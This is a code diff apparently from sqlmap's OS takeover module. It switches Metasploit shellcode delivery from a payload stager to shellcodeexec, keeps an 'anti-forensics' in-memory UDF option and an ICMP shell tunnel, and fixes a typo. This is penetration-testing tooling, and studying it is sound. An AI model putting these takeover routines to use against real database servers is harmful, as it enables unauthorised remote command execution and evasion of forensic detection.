@@ -156,7 +156,7 @@ class Takeover(Abstraction, Metasploit, ICMPsh, Registry, Miscellaneous):
                 errMsg += "# sysctl -w net.ipv4.icmp_echo_ignore_all=1\n"
                 errMsg += "If you miss doing that, you will receive "
                 errMsg += "information from the database server and it "
-                errMsg += "is unlikely to receive commands send from you"
+                errMsg += "is unlikely to receive commands sent from you"
                 logger.error(errMsg)
 
             if Backend.getIdentifiedDbms() in ( DBMS.MYSQL, DBMS.PGSQL ):
@@ -173,7 +173,7 @@ class Takeover(Abstraction, Metasploit, ICMPsh, Registry, Miscellaneous):
                     msg  = "how do you want to execute the Metasploit shellcode "
                     msg += "on the back-end database underlying operating system?"
                     msg += "\n[1] Via UDF 'sys_bineval' (in-memory way, anti-forensics, default)"
-                    msg += "\n[2] Stand-alone payload stager (file system way)"
+                    msg += "\n[2] Via shellcodeexec (file system way)"
 
                     while True:
                         choice = readInput(msg, default=1)
@@ -193,10 +193,12 @@ class Takeover(Abstraction, Metasploit, ICMPsh, Registry, Miscellaneous):
                         goUdf = True
 
                 if goUdf:
-                    self.createMsfShellcode(exitfunc="thread", format="raw", extra="BufferRegister=EAX", encode="x86/alpha_mixed")
+                    exitfunc="thread"
                 else:
-                    self.createMsfPayloadStager()
-                    self.uploadMsfPayloadStager()
+                    exitfunc="process"
+
+                self.createMsfShellcode(exitfunc=exitfunc, format="raw", extra="BufferRegister=EAX", encode="x86/alpha_mixed")
+                self.uploadShellcodeexec()
 
                 if Backend.isOs(OS.WINDOWS) and conf.privEsc:
                     if Backend.getIdentifiedDbms() == DBMS.MYSQL:
@@ -239,8 +241,8 @@ class Takeover(Abstraction, Metasploit, ICMPsh, Registry, Miscellaneous):
                 self.getRemoteTempPath()
 
                 if tunnel == 1:
-                    self.createMsfPayloadStager()
-                    self.uploadMsfPayloadStager(web=web)
+                    self.createMsfShellcode(exitfunc="process", format="raw", extra="BufferRegister=EAX", encode="x86/alpha_mixed")
+                    self.uploadShellcodeexec(web=web)
                 elif tunnel == 2:
                     self.uploadIcmpshSlave(web=web)
                     self.icmpPwn()
